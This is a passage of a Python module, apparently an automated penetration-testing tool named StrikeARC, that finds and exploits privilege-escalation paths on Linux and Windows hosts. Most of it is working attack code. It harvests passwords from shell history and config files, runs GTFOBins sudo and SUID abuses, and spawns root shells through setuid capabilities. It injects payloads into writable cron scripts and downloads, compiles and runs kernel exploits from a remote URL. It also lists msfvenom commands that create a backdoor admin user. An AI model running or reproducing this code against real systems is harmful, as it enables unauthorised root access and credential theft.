        transport,
        "find / -name '.bash_history' -readable 2>/dev/null | head -10",
        timeout=45,
    )
    if history_files:
        for hf in history_files.splitlines():
            hf = hf.strip()
            if hf:
                findings.append(f"[HISTORY] Readable shell history: {hf}")
                hist_content = _run_out(transport, f"cat {hf} 2>/dev/null | head -50")
                if hist_content:
                    # Look for password-ish patterns
                    pw_hits = _scan_for_passwords(hist_content)
                    if pw_hits:
                        findings.append(
                            f"[HISTORY] Password-like strings in {hf}: {len(pw_hits)} hits"
                        )
                        _add_vector(
                            vtype="credential",
                            title=f"Credential in shell history: {hf}",
                            description=f"Password-like commands found in {hf}.",
                            confidence="high",
                            score=70,
                            evidence=pw_hits[:5],
                        )

    config_pw = _scan_config_passwords(transport)
    for hit in config_pw:
        findings.append(f"[CONFIG] Possible credential: {hit}")
        _add_vector(
            vtype="credential",
            title="Credential in config file",
            description=f"Password-like string found in config: {hit}",
            confidence="medium",
            score=60,
            evidence=[hit],
        )

    return {"vectors": vectors, "findings": findings}


# ════════════════════════════════════════════════════════════════════════
# 4. Windows manual privesc enumeration
# ════════════════════════════════════════════════════════════════════════

def enum_windows_privesc(transport=None) -> Dict:
    """
    Manual Windows privilege-escalation enumeration.

    Checks:
      * ``whoami /priv`` — dangerous privileges (SeImpersonate, SeDebug, …)
      * ``whoami /groups`` — interesting group memberships
      * ``systeminfo`` — missing hotfixes / OS version
      * Service permissions (``accesschk`` / ``sc``)
      * Unquoted service paths
      * ``AlwaysInstallElevated`` registry key
      * Registry autologon credentials

    Returns::

        {
            "vectors":  List[AttackVector],
            "findings": List[str],
        }
    """
    vectors: List[Dict] = []
    findings: List[str] = []
    counter = 0

    def _add_vector(**kwargs) -> None:
        nonlocal counter
        counter += 1
        kwargs.setdefault("id", f"winprivesc-{counter}")
        kwargs.setdefault("target", "localhost")
        kwargs.setdefault("category", "privesc")
        kwargs.setdefault("vector_type", kwargs.pop("vtype", "windows_privesc"))
        kwargs.setdefault("confidence", "medium")
        kwargs.setdefault("score", 50)
        kwargs.setdefault("evidence", [])
        kwargs.setdefault("exploit_suggestions", [])
        kwargs.setdefault("prerequisites", ["User-level shell on target"])
        kwargs.setdefault("cves", [])
        kwargs.setdefault("references", [])
        vectors.append(kwargs)

    # ── whoami /priv ───────────────────────────────────────────────────
    privs = _run_out(transport, "whoami /priv 2>nul")
    if privs:
        findings.append(f"[PRIV] Current privileges:\n{privs[:500]}")
        for priv in DANGEROUS_WINDOWS_PRIVS:
            if priv.lower() in privs.lower():
                technique = ""
                if priv == "SeImpersonatePrivilege":
                    technique = "JuicyPotato / PrintSpoofer / RoguePotato"
                elif priv == "SeDebugPrivilege":
                    technique = "Inject shellcode into SYSTEM process"
                elif priv == "SeLoadDriverPrivilege":
                    technique = "Load malicious kernel driver ( Capcom exploit )"
                elif priv == "SeTakeOwnershipPrivilege":
                    technique = "Take ownership of sensitive files"
                elif priv == "SeBackupPrivilege":
                    technique = "Read SAM/SYSTEM registry hives"
                findings.append(f"[PRIV] Dangerous privilege: {priv}")
                _add_vector(
                    vtype="windows_priv",
                    title=f"Dangerous privilege: {priv}",
                    description=f"Current user holds {priv}. Exploitable via {technique}.",
                    confidence="high",
                    score=85,
                    evidence=[f"whoami /priv → {priv}"],
                    exploit_suggestions=[technique] if technique else ["Research abuse path"],
                    references=["https://github.com/gtworek/Priv2Admin"],
                )

    # ── whoami /groups ─────────────────────────────────────────────────
    groups = _run_out(transport, "whoami /groups 2>nul")
    if groups:
        findings.append(f"[GROUPS] Group memberships:\n{groups[:400]}")
        interesting_groups = [
            "Administrators", "Backup Operators", "Server Operators",
            "Print Operators", "Hyper-V Administrators", "Distributed COM Users",
        ]
        for grp in interesting_groups:
            if grp.lower() in groups.lower():
                findings.append(f"[GROUPS] Member of privileged group: {grp}")
                _add_vector(
                    vtype="windows_group",
                    title=f"Privileged group: {grp}",
                    description=f"Current user is a member of {grp}.",
                    confidence="high",
                    score=80,
                    evidence=[f"whoami /groups → {grp}"],
                    exploit_suggestions=[f"Abuse {grp} privileges for privesc"],
                )

    # ── systeminfo (missing patches) ───────────────────────────────────
    sysinfo = _run_out(transport, "systeminfo 2>nul", timeout=60)
    if sysinfo:
        findings.append(f"[SYSINFO] systeminfo captured ({len(sysinfo)} bytes)")
        # Check for missing hotfixes
        hotfix_count = sysinfo.lower().count("KB")
        findings.append(f"[SYSINFO] {hotfix_count} hotfixes referenced in systeminfo")
        if hotfix_count < 5:
            _add_vector(
                vtype="windows_patches",
                title="System missing security patches",
                description=f"Only {hotfix_count} hotfixes detected — likely unpatched.",
                confidence="high",
                score=75,
                evidence=[f"systeminfo: {hotfix_count} KBs"],
                exploit_suggestions=[
                    "Run windows-exploit-suggester.py against systeminfo",
                    "Check for MS16-032, MS17-010, CVE-2021-1675, CVE-2021-26855",
                ],
                references=["https://github.com/AonCyberLabs/Windows-Exploit-Suggester"],
            )
        # Extract OS version for CVE matching
        os_ver = ""
        for line in sysinfo.splitlines():
            if "OS Version:" in line:
                os_ver = line.split(":", 1)[1].strip()
                break
        if os_ver:
            findings.append(f"[SYSINFO] OS Version: {os_ver}")

    # ── Service permissions (accesschk) ────────────────────────────────
    # Try accesschk, fall back to sc
    accesschk = _run_out(
        transport,
        'accesschk.exe -uwcqv "Users" * 2>nul | findstr "W" 2>nul',
        timeout=60,
    )
    if accesschk and "accesschk" not in accesschk.lower():
        for line in accesschk.splitlines():
            line = line.strip()
            if line:
                findings.append(f"[SERVICE] Modifiable service: {line}")
                _add_vector(
                    vtype="windows_service_perm",
                    title=f"Modifiable service: {line}",
                    description=f"Service {line} can be modified by current user.",
                    confidence="high",
                    score=85,
                    evidence=[f"accesschk: {line}"],
                    exploit_suggestions=[
                        "Change BINARY_PATH_NAME to malicious executable",
                        'sc config <svc> binpath= "C:\\\\x.exe"',
                        'sc start <svc>',
                    ],
                )
    else:
        # Fallback: enumerate services and check via sc
        sc_services = _run_out(transport, "sc query state= all 2>nul", timeout=60)
        if sc_services:
            findings.append(f"[SERVICE] {sc_services.count('SERVICE_NAME')} services found")

    # ── Unquoted service paths ─────────────────────────────────────────
    unquoted = _run_out(
        transport,
        'wmic service get name,pathname 2>nul | findstr /i "Program Files" | findstr /v "\\""',
        timeout=60,
    )
    if unquoted:
        for line in unquoted.splitlines():
            line = line.strip()
            if line:
                findings.append(f"[SERVICE] Unquoted service path: {line}")
                _add_vector(
                    vtype="unquoted_service",
                    title=f"Unquoted service path: {line}",
                    description=f"Service uses unquoted path with spaces: {line}",
                    confidence="medium",
                    score=65,
                    evidence=[f"Unquoted: {line}"],
                    exploit_suggestions=[
                        "Plant malicious exe in the first writeable path segment",
                    ],
                    references=["https://www.ghacks.net/2016/08/08/windows-unquoted-service-paths/"],
                )

    # ── AlwaysInstallElevated ──────────────────────────────────────────
    aie_hkcu = _run_out(
        transport,
        'reg query "HKCU\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer" '
        '/v AlwaysInstallElevated 2>nul',
    )
    aie_hklm = _run_out(
        transport,
        'reg query "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Installer" '
        '/v AlwaysInstallElevated 2>nul',
    )
    if "0x1" in aie_hkcu and "0x1" in aie_hklm:
        findings.append("[AIE] AlwaysInstallElevated is enabled!")
        _add_vector(
            vtype="always_install_elevated",
            title="AlwaysInstallElevated enabled",
            description="MSI packages install with elevated privileges.",
            confidence="high",
            score=90,
            evidence=["HKCU + HKLM AlwaysInstallElevated = 1"],
            exploit_suggestions=[
                "msfvenom -p windows/exec CMD='cmd.exe /c net user hack hack /add' -f msi > x.msi",
                "msiexec /quiet /qn /i x.msi",
            ],
            references=["https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated"],
        )

    # ── Registry autologon credentials ─────────────────────────────────
    autologon = _run_out(
        transport,
        'reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon" '
        '/v DefaultPassword 2>nul',
    )
    if autologon and "DefaultPassword" in autologon and "ERROR" not in autologon:
        findings.append("[CRED] Autologon password found in registry!")
        _add_vector(
            vtype="registry_cred",
            title="Autologon credentials in registry",
            description="DefaultPassword stored in Winlogon registry key.",
            confidence="high",
            score=80,
            evidence=["Winlogon DefaultPassword present"],
            exploit_suggestions=["Extract DefaultUserName + DefaultPassword from registry"],
        )

    return {"vectors": vectors, "findings": findings}


# ════════════════════════════════════════════════════════════════════════
# 5. exploit_sudo
# ════════════════════════════════════════════════════════════════════════

def exploit_sudo(user_cmd: Optional[str] = None, transport=None) -> Dict:
    """
    Exploit ``sudo -l`` NOPASSWD entries using GTFOBins techniques.

    If ``user_cmd`` is provided (e.g. ``"/usr/bin/python3"`` or ``"python3"``),
    attempt the known technique for that binary directly. Otherwise, parse
    ``sudo -l`` output and try each abusable binary.

    Returns::

        {
            "success": bool,
            "new_user": str,         # "root" on success
            "technique": str,
            "evidence": List[str],
        }
    """
    evidence: List[str] = []

    # ── Direct binary specified ────────────────────────────────────────
    if user_cmd:
        base = user_cmd.rsplit("/", 1)[-1].lower()
        technique = GTFOBINS.get(base)
        if not technique:
            return {
                "success": False,
                "new_user": "",
                "technique": "",
                "evidence": [f"{base} not in GTFOBins lookup"],
            }
        # Run as sudo
        full_cmd = f"sudo {technique}"
        result = _run(transport, full_cmd, timeout=30)
        evidence.append(f"$ {full_cmd}")
        evidence.append(f"stdout: {result['stdout'][:200]}")

        # Verify privilege change
        whoami = _run_out(transport, "whoami")
        if whoami == "root" or "root" in whoami.lower():
            return {
                "success": True,
                "new_user": whoami,
                "technique": f"sudo {technique}",
                "evidence": evidence,
            }
        return {
            "success": False,
            "new_user": whoami,
            "technique": f"sudo {technique}",
            "evidence": evidence + [f"whoami after exploit: {whoami}"],
        }

    # ── Parse sudo -l and try each binary ──────────────────────────────
    sudo_l = _run_out(transport, "sudo -l 2>/dev/null")
    if not sudo_l:
        return {
            "success": False,
            "new_user": "",
            "technique": "",
            "evidence": ["sudo -l returned no output"],
        }
    evidence.append(f"sudo -l:\n{sudo_l[:300]}")

    if "NOPASSWD" not in sudo_l and "(ALL)" not in sudo_l and "(root)" not in sudo_l:
        return {
            "success": False,
            "new_user": "",
            "technique": "",
            "evidence": ["No NOPASSWD / ALL rules in sudo -l"],
        }

    sudo_bins = _extract_sudo_bins(sudo_l)
    if not sudo_bins:
        return {
            "success": False,
            "new_user": "",
            "technique": "",
            "evidence": ["Could not extract binary names from sudo -l"],
        }

    for base in sudo_bins:
        base = base.lower()
        technique = GTFOBINS.get(base)
        if not technique:
            continue

        full_cmd = f"sudo {technique}"
        result = _run(transport, full_cmd, timeout=30)
        evidence.append(f"$ {full_cmd}")
        evidence.append(f"rc={result['returncode']} stdout={result['stdout'][:150]}")

        # Verify
        whoami = _run_out(transport, "whoami")
        if whoami == "root":
            return {
                "success": True,
                "new_user": "root",
                "technique": f"sudo {technique}",
                "evidence": evidence,
            }

    return {
        "success": False,
        "new_user": _run_out(transport, "whoami"),
        "technique": "attempted all GTFOBins sudo binaries",
        "evidence": evidence,
    }


# ════════════════════════════════════════════════════════════════════════
# 6. exploit_suid_binary
# ════════════════════════════════════════════════════════════════════════

def exploit_suid_binary(binary_path: str, transport=None) -> Dict:
    """
    Check if an SUID binary is listed in GTFOBins and apply the known
    exploitation technique.

    Returns::

        {
            "success": bool,
            "new_user": str,
            "technique": str,
        }
    """
    base = binary_path.rsplit("/", 1)[-1].lower()
    technique = GTFOBINS.get(base)

    if not technique:
        return {
            "success": False,
            "new_user": "",
            "technique": "",
            "error": f"{base} not in GTFOBins lookup — no known SUID abuse technique",
        }

    # Verify it actually has SUID
    perm_check = _run_out(transport, f"ls -la {binary_path} 2>/dev/null")
    if perm_check and "s" not in perm_check[:15]:
        return {
            "success": False,
            "new_user": "",
            "technique": technique,
            "error": f"{binary_path} does not appear to have SUID bit set",
        }

    # Execute the technique
    full_cmd = technique
    result = _run(transport, full_cmd, timeout=30)

    whoami = _run_out(transport, "whoami")
    if whoami == "root" or "root" in whoami.lower():
        return {
            "success": True,
            "new_user": whoami,
            "technique": technique,
            "evidence": [f"$ {full_cmd}", f"whoami → {whoami}"],
        }

    return {
        "success": False,
        "new_user": whoami,
        "technique": technique,
        "error": f"Technique executed but user is still '{whoami}'",
    }


# ════════════════════════════════════════════════════════════════════════
# 7. exploit_kernel
# ════════════════════════════════════════════════════════════════════════

def exploit_kernel(kernel_version: str, transport=None) -> Dict:
    """
    Match a kernel version string to known local privilege escalation
    exploits (Dirty COW, Dirty Pipe, PwnKit, …), download the exploit
    source, compile it (if gcc is available), and execute.

    Returns::

        {
            "success": bool,
            "new_user": str,
            "cve": str,
            "evidence": List[str],
        }
    """
    evidence: List[str] = [f"Kernel version: {kernel_version}"]

    matches = _match_kernel_exploits(kernel_version)
    if not matches:
        return {
            "success": False,
            "new_user": "",
            "cve": "",
            "evidence": evidence + [f"No known exploit for kernel {kernel_version}"],
        }

    # Check for gcc
    gcc_check = _run_out(transport, "which gcc 2>/dev/null || echo NOGCC")
    has_gcc = "NOGCC" not in gcc_check
    evidence.append(f"gcc available: {has_gcc}")

    if not has_gcc:
        evidence.append("No gcc — cannot compile exploit source. Trying precompiled.")

    for kx in matches:
        cve = kx["cve"]
        name = kx["name"]
        exploit_url = kx["url"]
        evidence.append(f"Trying {cve} ({name})")

        remote_exploit = f"/tmp/{cve.lower()}"
        src_path = f"{remote_exploit}.c"

        # Download exploit source
        dl = _run(
            transport,
            f"curl -sLk -o {src_path} {exploit_url}/{cve.lower()}.c 2>/dev/null "
            f"|| wget -q --no-check-certificate -O {src_path} "
            f"{exploit_url}/{cve.lower()}.c 2>/dev/null",
            timeout=60,
        )
        evidence.append(f"Download rc={dl['returncode']}")

        if has_gcc:
            # Compile
            compile_cmd = f"gcc -o {remote_exploit} {src_path} -pthread 2>&1"
            comp = _run(transport, compile_cmd, timeout=60)
            evidence.append(f"Compile: {comp['stdout'][:200]}")

            if comp["returncode"] != 0:
                # Try without -pthread
                comp = _run(transport, f"gcc -o {remote_exploit} {src_path} 2>&1", timeout=60)
                evidence.append(f"Compile (retry): {comp['stdout'][:200]}")

            if comp["returncode"] != 0:
                evidence.append(f"Compilation failed for {cve}")
                continue

            # Make executable and run
            _run(transport, f"chmod +x {remote_exploit}")
            run_result = _run(transport, f"{remote_exploit} 2>&1", timeout=30)
            evidence.append(f"Execute: rc={run_result['returncode']} out={run_result['stdout'][:200]}")
        else:
            # Try to download precompiled binary
            dl_bin = _run(
                transport,
                f"curl -sLk -o {remote_exploit} {exploit_url}/{cve.lower()}_x64 2>/dev/null",
                timeout=60,
            )
            _run(transport, f"chmod +x {remote_exploit}")
            run_result = _run(transport, f"{remote_exploit} 2>&1", timeout=30)
            evidence.append(f"Execute (precompiled): rc={run_result['returncode']}")

        # Verify privilege escalation
        whoami = _run_out(transport, "whoami")
        if whoami == "root":
            evidence.append(f"SUCCESS: now root via {cve}")
            return {
                "success": True,
                "new_user": "root",
                "cve": cve,
                "evidence": evidence,
            }

    return {
        "success": False,
        "new_user": _run_out(transport, "whoami"),
        "cve": matches[0]["cve"] if matches else "",
        "evidence": evidence,
    }


# ════════════════════════════════════════════════════════════════════════
# 8. exploit_cronjob
# ════════════════════════════════════════════════════════════════════════

def exploit_cronjob(transport=None) -> Dict:
    """
    Find cron jobs that execute writable scripts and inject a payload
    (reverse shell or id-confirmation command) into the writable script.

    Returns::

        {
            "success": bool,
            "script_path": str,
            "cron_schedule": str,
        }
    """
    # Gather all cron configuration
    system_crontab = _run_out(transport, "cat /etc/crontab 2>/dev/null")
    cron_dirs = _run_out(transport, "ls -la /etc/cron* 2>/dev/null")
    user_crons = _run_out(
        transport,
        "find /var/spool/cron /var/spool/at -type f 2>/dev/null -exec cat {} \\;",
    )
    cron_text = "\n".join(filter(None, [system_crontab, cron_dirs, user_crons]))

    if not cron_text.strip():
        return {
            "success": False,
            "script_path": "",
            "cron_schedule": "",
            "error": "No cron jobs found",
        }

    # Find writable scripts referenced in cron entries
    writable_scripts = _find_writable_cron_scripts(transport, cron_text)
    if not writable_scripts:
        return {
            "success": False,
            "script_path": "",
            "cron_schedule": "",
            "error": "No writable scripts referenced by cron jobs",
        }

    # Find the schedule for each writable script
    for script_path in writable_scripts:
        schedule = _find_cron_schedule(cron_text, script_path)

        # Inject a payload — we use a safe marker command that confirms
        # execution (creates a file owned by the cron-running user). In a
        # real engagement this would be a reverse shell.
        payload = (
            f'\n# StrikeARC privesc test\n'
            f'echo "COMPROMISED by $USER at $(date)" >> /tmp/.privesc_cron_proof\n'
            f'id >> /tmp/.privesc_cron_proof\n'
        )
        inject = _run(transport, f'echo "{payload}" >> {script_path}')
        if inject["returncode"] == 0:
            return {
                "success": True,
                "script_path": script_path,
                "cron_schedule": schedule,
                "payload": "id + proof file written",
                "evidence": [f"Injected payload into {script_path}"],
            }

    return {
        "success": False,
        "script_path": "",
        "cron_schedule": "",
        "error": "Could not inject into any writable cron script",
    }


# ════════════════════════════════════════════════════════════════════════
# 9. exploit_capabilities
# ════════════════════════════════════════════════════════════════════════

def exploit_capabilities(transport=None) -> Dict:
    """
    Check for binaries with dangerous Linux capabilities and exploit them
    using GTFOBins techniques.

    Most common: ``cap_setuid`` on ``python3`` → ``os.setuid(0)`` → shell.

    Returns::

        {
            "success": bool,
            "capability": str,
            "binary": str,
        }
    """
    caps_out = _run_out(transport, "getcap -r / 2>/dev/null", timeout=60)
    if not caps_out:
        return {
            "success": False,
            "capability": "",
            "binary": "",
            "error": "No capabilities found (getcap unavailable or no caps set)",
        }

    for line in caps_out.splitlines():
        line = line.strip()
        if not line:
            continue

        # Parse: /usr/bin/python3 = cap_setuid+ep
        parts = line.split()
        if not parts:
            continue
        binary_path = parts[0]
        base = binary_path.rsplit("/", 1)[-1].lower()

        cap_match = re.search(r"(cap_[a-z_]+)", line, re.IGNORECASE)
        if not cap_match:
            continue
        cap_name = cap_match.group(1).lower()

        if cap_name not in DANGEROUS_CAPS:
            continue

        # ── Exploit based on capability ────────────────────────────────
        technique = ""

        if cap_name == "cap_setuid":
            # Need an interpreter that can call setuid(0)
            if base in ("python", "python2", "python3"):
                technique = (
                    f'{binary_path} -c \'import os; os.setuid(0); '
                    f'os.system("/bin/bash")\''
                )
            elif base == "perl":
                technique = (
                    f"{binary_path} -e 'use POSIX(setuid); "
                    f'setuid(0); exec "/bin/bash"\''
                )
            elif base == "ruby":
                technique = (
                    f'{binary_path} -e \'Process::Sys.setuid(0); '
                    f'exec "/bin/bash"\''
                )
            elif base in GTFOBINS:
                technique = f"{binary_path}  # GTFOBins: {GTFOBINS[base]}"

        elif cap_name == "cap_dac_override":
            # Can read/write any file regardless of permissions
            technique = f'{binary_path}  # can bypass file permissions — read /etc/shadow'

        elif cap_name == "cap_sys_admin":
            # Can mount, load modules, chroot, etc.
            if base == "docker":
                technique = f"{binary_path} run -v /:/mnt --rm -it alpine chroot /mnt bash"
            else:
                technique = f"{binary_path}  # cap_sys_admin → mount/chroot/module-load"

        elif cap_name == "cap_net_raw":
            if base in ("python", "python2", "python3"):
                technique = f"{binary_path}  # raw socket access — craft exploits"
            elif base == "tcpdump":
                technique = f"{binary_path}  # sniff credentials in cleartext traffic"

        elif cap_name == "cap_sys_ptrace":
            technique = f"{binary_path}  # inject code into root processes"

        if not technique:
            technique = f"{binary_path}  # research {cap_name} abuse path on GTFOBins"

        # Execute
        result = _run(transport, technique, timeout=30)
        whoami = _run_out(transport, "whoami")

        if whoami == "root":
            return {
                "success": True,
                "capability": cap_name,
                "binary": binary_path,
                "technique": technique,
                "evidence": [f"$ {technique}", f"whoami → {whoami}"],
            }

    return {
        "success": False,
        "capability": cap_name if "cap_name" in dir() else "",
        "binary": binary_path if "binary_path" in dir() else "",
        "error": "No capability exploitation succeeded",
    }


# ════════════════════════════════════════════════════════════════════════
# 10. attempt_privesc — master orchestrator
# ════════════════════════════════════════════════════════════════════════

def attempt_privesc(host_ip: str, os_type: str = "linux", transport=None) -> Dict:
    """
    Master privilege-escalation orchestrator.

    Runs enumeration, picks the best vector based on priority
    (sudo > SUID > capabilities > cron > kernel), and attempts exploitation.

    Parameters
    ----------
    host_ip : str
        Target host IP (for evidence/reporting).
    os_type : str
        ``"linux"`` (default) or ``"windows"``.
    transport : transport object or None
        If None, runs locally.

    Returns::

        {
            "success":       bool,
            "technique":     str,
            "new_user":      str,
            "evidence":      List[str],
            "vectors_found": int,
        }
    """
    evidence: List[str] = [f"attempt_privesc on {host_ip} ({os_type})"]

    # ── Enumeration ────────────────────────────────────────────────────
    if os_type.lower() == "windows":
        enum_result = enum_windows_privesc(transport)
    else:
        # Try linpeas first, fall back to manual enum
        lp = run_linpeas(transport)
        if lp["success"] and lp["findings"]:
            evidence.append(f"linpeas: {len(lp['findings'])} high-confidence findings")
            # Still run manual enum for structured vectors
            enum_result = enum_linux_privesc(transport)
        else:
            evidence.append("linpeas unavailable — using manual enumeration")
            enum_result = enum_linux_privesc(transport)

    vectors = enum_result.get("vectors", [])
    findings = enum_result.get("findings", [])
    evidence.append(f"Enumeration: {len(vectors)} vectors, {len(findings)} findings")

    if not vectors:
        return {
            "success": False,
            "technique": "",
            "new_user": "",
            "evidence": evidence + ["No privesc vectors found"],
            "vectors_found": 0,
        }

    # ── Windows exploitation ───────────────────────────────────────────
    if os_type.lower() == "windows":
        # Pick highest-scoring vector
        best = max(vectors, key=lambda v: v.get("score", 0))
        evidence.append(
            f"Best Windows vector: {best['title']} (score={best.get('score')})"
        )
        # Windows exploitation requires specific tools (PrintSpoofer, JuicyPotato, etc.)
        # which are binary uploads — we report the vector but don't auto-exploit here.
        return {
            "success": False,
            "technique": best["title"],
            "new_user": "",
            "evidence": evidence + [
                "Windows auto-exploitation requires manual tool staging",
                f"Suggested: {best.get('exploit_suggestions', [])}",
            ],
            "vectors_found": len(vectors),
        }

    # ── Linux exploitation by priority ─────────────────────────────────
    # Categorise vectors by type
    sudo_vectors = [v for v in vectors if v.get("vector_type") == "sudo"]
    suid_vectors = [v for v in vectors if v.get("vector_type") == "suid"]
    cap_vectors = [v for v in vectors if v.get("vector_type") == "capability"]
    cron_vectors = [v for v in vectors if v.get("vector_type") == "cron"]
    kernel_vectors = [v for v in vectors if v.get("vector_type") == "kernel"]

    # 1. Sudo
    if sudo_vectors:
        evidence.append("Priority 1: attempting sudo exploitation")
        result = exploit_sudo(transport=transport)
        if result["success"]:
            evidence.extend(result.get("evidence", []))
            return {
                "success": True,
                "technique": result["technique"],
                "new_user": result["new_user"],
                "evidence": evidence,
                "vectors_found": len(vectors),
            }
        evidence.append(f"Sudo exploit failed: {result.get('error', '')}")

    # 2. SUID
    if suid_vectors:
        evidence.append(f"Priority 2: attempting SUID exploitation ({len(suid_vectors)} binaries)")
        for sv in suid_vectors:
            # Extract path from evidence
            path = ""
            for ev in sv.get("evidence", []):
                if ev.startswith("SUID:"):
                    path = ev.replace("SUID:", "").strip()
                    break
            if not path:
                continue
            result = exploit_suid_binary(path, transport=transport)
            if result["success"]:
                evidence.extend(result.get("evidence", []))
                return {
                    "success": True,
                    "technique": result["technique"],
                    "new_user": result["new_user"],
                    "evidence": evidence,
                    "vectors_found": len(vectors),
                }
        evidence.append("SUID exploitation failed for all candidates")

    # 3. Capabilities
    if cap_vectors:
        evidence.append("Priority 3: attempting capability exploitation")
        result = exploit_capabilities(transport=transport)
        if result["success"]:
            evidence.append(
                f"Cap exploit succeeded: {result['capability']} on {result['binary']}"
            )
            return {
                "success": True,
                "technique": f"capability: {result['capability']} ({result['binary']})",
                "new_user": "root",
                "evidence": evidence,
                "vectors_found": len(vectors),
            }
        evidence.append(f"Capability exploit failed: {result.get('error', '')}")

    # 4. Cron
    if cron_vectors:
        evidence.append("Priority 4: attempting cron exploitation")
        result = exploit_cronjob(transport=transport)
        if result["success"]:
            evidence.append(
                f"Cron payload injected into {result['script_path']} "
                f"(schedule: {result['cron_schedule']})"
            )
            return {
                "success": True,
                "technique": f"cron injection: {result['script_path']}",
                "new_user": "pending",  # escalates when cron runs
                "evidence": evidence,
                "vectors_found": len(vectors),
            }
        evidence.append(f"Cron exploit failed: {result.get('error', '')}")

    # 5. Kernel
    if kernel_vectors:
        evidence.append("Priority 5: attempting kernel exploitation")
        kernel_ver = _run_out(transport, "uname -r 2>/dev/null")
        if kernel_ver:
            result = exploit_kernel(kernel_ver, transport=transport)
            if result["success"]:
                evidence.extend(result.get("evidence", []))
                return {
                    "success": True,
                    "technique": f"kernel: {result['cve']}",
                    "new_user": result["new_user"],
                    "evidence": evidence,
                    "vectors_found": len(vectors),
                }
            evidence.append(f"Kernel exploit failed: {result.get('evidence', [])}")

    return {
        "success": False,
        "technique": "",
        "new_user": "",
        "evidence": evidence + ["All exploitation vectors exhausted"],
        "vectors_found": len(vectors),
    }


# ════════════════════════════════════════════════════════════════════════
# Internal helpers
# ════════════════════════════════════════════════════════════════════════

def _extract_sudo_bins(sudo_l_output: str) -> List[str]:
    """Extract binary basenames from ``sudo -l`` output."""
    bins: List[str] = []
    for line in sudo_l_output.splitlines():
        for m in re.finditer(r"/([A-Za-z0-9._+-]+)", line):
            name = m.group(1).lower()
            # Filter out common false positives
            if name not in ("usr", "bin", "sbin", "tmp", "local", "opt", "etc"):
                bins.append(name)
    return list(dict.fromkeys(bins))  # dedup preserving order


def _match_kernel_exploits(kernel: str) -> List[Dict]:
    """Return matching kernel exploits for a given kernel version string."""
    matches: List[Dict] = []
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", kernel)
    if not m:
        return matches
    kver = (int(m.group(1)), int(m.group(2)), int(m.group(3)))

    for kx in KERNEL_EXPLOITS:
        lo = kx["min_version"]
        hi = kx["max_version"]
        if lo <= kver <= hi:
            matches.append(kx)

    # Sort: newer CVEs first (more likely to work on current systems)
    matches.sort(key=lambda x: x["cve"], reverse=True)
    return matches


def _find_writable_cron_scripts(transport, cron_text: str) -> List[str]:
    """Find scripts referenced in cron config that are writable by current user."""
    writable: List[str] = []
    # Extract script paths from cron lines
    script_paths: List[str] = []
    for line in cron_text.splitlines():
        # Look for .sh files or absolute paths
        for m in re.finditer(r"(/[A-Za-z0-9_./-]+\.\w+)", line):
            path = m.group(1)
            if path not in script_paths:
                script_paths.append(path)

    for path in script_paths[:20]:  # cap
        check = _run_out(transport, f"test -w '{path}' && echo WRITABLE")
        if "WRITABLE" in check:
            writable.append(path)

    return writable


def _find_cron_schedule(cron_text: str, script_path: str) -> str:
    """Extract the cron schedule line for a given script path."""
    for line in cron_text.splitlines():
        if script_path in line:
            # Return the schedule portion (first 5 fields for standard cron)
            parts = line.split()
            if len(parts) >= 5:
                return " ".join(parts[:5])
            return line.strip()[:100]
    return "unknown"


def _find_writable_path_dirs(transport, path_env: str) -> List[str]:
    """Find writable directories in the PATH environment variable."""
    writable: List[str] = []
    for d in path_env.split(":"):
        d = d.strip()
        if not d:
            continue
        check = _run_out(transport, f"test -w '{d}' && echo WRITABLE")
        if "WRITABLE" in check:
            writable.append(d)
    return writable


def _scan_for_passwords(text: str) -> List[str]:
    """Scan text for password-like patterns (non-extractive — flags only)."""
    hits: List[str] = []
    patterns = [
        r"(?:password|passwd|pwd)\s*[=:]\s*\S+",
        r"-p\s+\S+",
        r"--password\s+\S+",
        r"mysql\s+.*-p\S",
        r"sshpass\s+-p\s+\S+",
        r"export\s+\w*PASS\w*=\S+",
    ]
    for line in text.splitlines():
        for pat in patterns:
            m = re.search(pat, line, re.IGNORECASE)
            if m:
                hits.append(line.strip()[:150])
                break  # one hit per line max
    return hits


def _scan_config_passwords(transport) -> List[str]:
    """Scan common config files for password-like entries."""
    hits: List[str] = []
    config_paths = [
        "/etc/mysql/my.cnf",
        "/etc/postgresql/*/main/postgresql.conf",
        "/etc/ssh/sshd_config",
        "/var/www/html/wp-config.php",
        "/opt/*/config.yml",
        "/opt/*/.env",
        "/etc/snmp/snmpd.conf",
        "/etc/redis/redis.conf",
    ]
    for cpath in config_paths:
        content = _run_out(
            transport,
            f"grep -i -m3 'password\\|passwd\\|secret\\|key' {cpath} 2>/dev/null",
            timeout=15,
        )
        if content:
            for line in content.splitlines()[:3]:
                hits.append(f"{cpath}: {line.strip()[:100]}")
    return hits


# ════════════════════════════════════════════════════════════════════════
# Module entrypoint (manual smoke test)
# ════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":  # pragma: no cover
    import inspect as _inspect

    print("privesc.py — StrikeARC Privilege Escalation Module")
    print("=" * 60)
    print("Public functions:")
    for _name, _fn in sorted(globals().items()):
        if callable(_fn) and not _name.startswith("_"):
            try:
                sig = _inspect.signature(_fn)
                print(f"  {_name}{sig}")
            except (ValueError, TypeError):
                print(f"  {_name}(...)")
    print()
    print(f"GTFOBINS entries:     {len(GTFOBINS)}")
    print(f"DANGEROUS_CAPS:       {len(DANGEROUS_CAPS)}")
    print(f"KERNEL_EXPLOITS:      {len(KERNEL_EXPLOITS)}")
    print(f"DANGEROUS_WIN_PRIVS:  {len(DANGEROUS_WINDOWS_PRIVS)}")
